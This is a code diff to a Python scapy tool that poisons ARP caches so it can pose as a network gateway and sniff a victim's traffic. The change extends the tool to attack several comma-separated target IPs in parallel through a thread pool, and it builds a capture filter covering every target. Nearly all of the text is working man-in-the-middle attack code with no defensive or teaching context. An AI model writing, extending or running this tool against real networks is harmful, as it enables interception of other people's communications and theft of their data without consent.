@@ -4,6 +4,8 @@ from scapy.all import Ether, ARP, conf, sniff, send, srp
 import sys
 import threading
 import logging
+from concurrent.futures import ThreadPoolExecutor
+
 
 logger = logging.getLogger()
 
@@ -48,14 +50,43 @@ def send_fake_arp(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
     return
 
 
-def start_fakegw(gateway_ip=None, target_ip=None, interface=None,
+def generate_param_list(gateway_ip, target_ips, stop_event):
+    """
+    Executorに食わすパラメータを生成します。
+    :param gateway_ip: ゲートウェイのIP
+    :param target_ips: カンマ区切りでターゲットのIPをつないだもの
+    :param stop_event: 停止シグナル受信用
+    :return:
+    """
+    gateway_mac = get_mac(gateway_ip)
+    if gateway_mac is None:
+        logger.error("failed to get %s mac" % gateway_ip)
+        sys.exit(0)
+    logger.info("gateway %s is at %s" % (gateway_ip, gateway_mac))
+    param_list = []
+    target_ip_list = target_ips.split(',')
+    for target_ip in target_ip_list:
+        target_mac = get_mac(target_ip)
+        if target_mac is None:
+            logger.error(" failed to get %s mac." % target_ip)
+            continue
+        logger.info("target %s is at %s" % (target_ip, target_mac))
+        param_list.append((gateway_ip,
+                           gateway_mac,
+                           target_ip,
+                           target_mac,
+                           stop_event))
+    return param_list
+
+
+def start_fakegw(gateway_ip=None, target_ips=None, interface=None,
                  bpf_filter=None, callback=None):
     """
     ARPパケット偽装して投げます。
     あと、sniffを立ち上げてパケット処理を開始します。
     パケットの処理は引数で指定したcallback関数を使います。
     :param gateway_ip: 通信相手A
-    :param target_ip: 通信相手B
+    :param target_ips: 通信相手B
     :param interface: インターフェース名
     :param bpf_filter: BPFフィルタ形式の文字列
     :param callback: パケット処理する関数
@@ -65,44 +96,34 @@ def start_fakegw(gateway_ip=None, target_ip=None, interface=None,
     if interface is not None:
         conf.iface = interface
     conf.verb = 0
-    gateway_mac = get_mac(gateway_ip)
 
-    if gateway_mac is None:
-        logger.error("failed to get %s mac" % gateway_ip)
-        sys.exit(0)
-    else:
-        logger.info("gateway %s is at %s" % (gateway_ip, gateway_mac))
-
-    target_mac = get_mac(target_ip)
-
-    if target_mac is None:
-        logger.error(" failed to get %s mac." % target_ip)
-        sys.exit(0)
-    else:
-        logger.info("target %s is at %s" % (target_ip, target_mac))
-
-    # make arp sender thread
+    # make stop event
     stop_event = threading.Event()
-    poison_thread = threading.Thread(target=send_fake_arp,
-                                     args=(gateway_ip,
-                                           gateway_mac,
-                                           target_ip,
-                                           target_mac,
-                                           stop_event))
-    poison_thread.start()
 
-    logger.info("starting sniffer for %s" % target_ip)
+    # setup executor service
+    executor = ThreadPoolExecutor(max_workers=4)
+    param_list = generate_param_list(gateway_ip, target_ips, stop_event)
+    futures = [executor.submit(send_fake_arp, *param) for param in param_list]
+
+    # create filter string
     if bpf_filter is None:
-        bpf_filter = "ip host %s" % target_ip
+        tmp_str = reduce(lambda x, y: x + "ip host %s or " % y,
+                            target_ips.split(','), "")
+        bpf_filter = tmp_str.strip().rstrip('or')
+
+    logger.info("starting sniffer")
     if interface is None:
         sniff(filter=bpf_filter, prn=callback, store=0)
     else:
         sniff(filter=bpf_filter, prn=callback, iface=interface, store=0)
 
-    # thread start
+    # stop event set
     stop_event.set()
     # wait for child thread.
-    poison_thread.join()
+    for future in futures:
+        future.result()
+    executor.shutdown()
 
     # restore target arp table
-    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    for (gateway_ip, gateway_mac, target_ip, target_mac, stop_event) in param_list:
+        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
